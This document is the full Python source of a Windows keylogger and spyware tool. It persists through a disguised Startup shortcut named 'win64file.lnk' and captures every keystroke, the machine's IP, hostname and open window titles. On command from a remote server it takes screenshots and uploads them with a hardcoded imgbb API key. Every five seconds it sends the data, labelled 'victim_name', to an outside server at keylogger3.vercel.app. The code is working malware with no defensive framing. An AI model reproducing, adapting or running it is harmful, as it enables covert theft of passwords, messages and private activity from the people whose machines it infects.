import os
import win32com.client
from PIL import ImageGrab
import requests
import json
import threading
from pynput import keyboard
import pygetwindow as gw
import socket


IMGEBB_API_KEY = 'b46299dff05f004ef4247f2cab03ead9'

text = ""
last_sent_text = ""
time_interval = 5
screenshot_path = 'screenshot.png'

file_path = os.path.abspath(__file__)

def create_startup_shortcut():

    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(os.path.join(startup_folder, 'win64file.lnk'))
    shortcut.TargetPath = file_path
    shortcut.save()

def take_screenshot(file_path):
    screenshot = ImageGrab.grab()
    screenshot.save(file_path)

def upload_to_imgbb(file_path):
    with open(file_path, 'rb') as image_file:
        payload = {'key': IMGEBB_API_KEY}
        files = {'image': image_file}
        response = requests.post('https://api.imgbb.com/1/upload', data=payload, files=files)
        response_json = response.json()

        if response.status_code == 200 and response_json.get('success'):
            return response_json['data']['url']
        else:
            print(f"Failed to upload image. Error: {response_json.get('error', 'Unknown error')}")
            return None

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"File {file_path} deleted successfully.")
    else:
        print(f"File {file_path} does not exist.")

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except requests.RequestException:
        return "Unknown IP"

def get_hostname():
    return socket.gethostname()

def get_windows():
    return [window for window in gw.getAllTitles() if window]

def send_post_req():
    global text, last_sent_text

    try:
        new_text = ""
        if text != last_sent_text:
            new_text = text[len(last_sent_text):]
            last_sent_text += text[len(last_sent_text):]

        ip = get_ip()
        hostname = get_hostname()
        windows = get_windows()

        image_url = None
        respond = requests.get("https://keylogger3.vercel.app/command-screenshot").text
        if respond == "ok":
            take_screenshot(screenshot_path)
            image_url = upload_to_imgbb(screenshot_path)
            if image_url:
                print(f"Image uploaded successfully! URL: {image_url}")
                delete_file(screenshot_path)
            payload = json.dumps({
                "keyboardData": new_text,
                "ip": ip,
                "victim_name": hostname,
                "open_windows": windows,
                "image_url": image_url
            })
            headers = {"Content-Type": "application/json"}
            r = requests.post("https://keylogger3.vercel.app/data", data=payload, headers=headers)

        payload = json.dumps({
            "keyboardData": new_text,
            "ip": ip,
            "victim_name": hostname,
            "open_windows": windows,
            "image_url": image_url
        })
        headers = {"Content-Type": "application/json"}
        r = requests.post("https://keylogger3.vercel.app/data", data=payload, headers=headers)
        timer = threading.Timer(time_interval, lambda: send_post_req())
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


create_startup_shortcut()


with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
